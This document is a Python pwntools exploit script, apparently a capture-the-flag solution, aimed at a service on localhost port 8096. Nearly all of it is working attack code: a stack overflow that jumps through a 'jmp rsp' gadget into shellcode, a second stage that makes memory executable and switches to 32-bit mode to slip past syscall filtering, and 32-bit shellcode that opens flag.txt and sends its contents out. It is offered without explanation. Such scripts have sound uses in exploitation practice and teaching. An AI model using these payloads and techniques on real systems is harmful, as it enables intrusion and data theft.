from pwn import *
import time

p = remote('localhost',8096)


jmprsp = 0x000000000040185d

shellcode = '''
xor rax, rax
mov rdi, rax
mov edi, 0x4040c4
mov rdi, [rdi]
mov rdx, rax
mov rsi, rsp
sub rsi, 0x20
mov dl, 200
syscall
add rsi, 8
call rsi
'''
shellcode = asm(shellcode, arch='amd64')
print len(shellcode)
shellcode1 = '\xeb\xd2'


shell = """
    mov rsp, 0x4040c4
    xor rax, rax
    mov rdi, 0x404000
    mov rsi, 0x1000
    mov rdx, 7
    mov eax, 9
    inc al
    syscall

    xor rax, rax
    mov rdi, rax
    mov edi, 0x4040c4
    mov rdi, [rdi]
    mov rdx, rax
    mov rsi, 0x4040d0
    mov dl, 200
    syscall
    mov rbp, rax
    mov rcx, rax
    ror rsi, 32
    mov sil, 0x23
    ror rsi, 32
    add sil, 9
    push rsi
"""
shell32 = '''
    xor eax, eax
    mov ebx, 0x4040d0
    mov ecx, eax
    mov cl, 4
    mov edx, eax 
    mov al, 5
    int 0x80

    mov ecx, eax
    mov ax, 187
    pop ebx
    xor edx, edx
    xor esi, esi
    mov si, 100
    int 0x80

    xor eax, eax
    inc eax
    int 0x80
'''

shell = asm(shell, arch='amd64') + '\xcb'
shell32 = asm(shell32,arch='i386')


print shellcode.encode('hex')
p.sendline('done'+'\x90'*(36-len(shellcode))+shellcode+ p64(jmprsp) + shellcode1)
time.sleep(.1)



p.sendline('\x90'*30+ shell)
p.interactive()
p.sendline('flag.txt\x00'+shell32)




p.interactive()
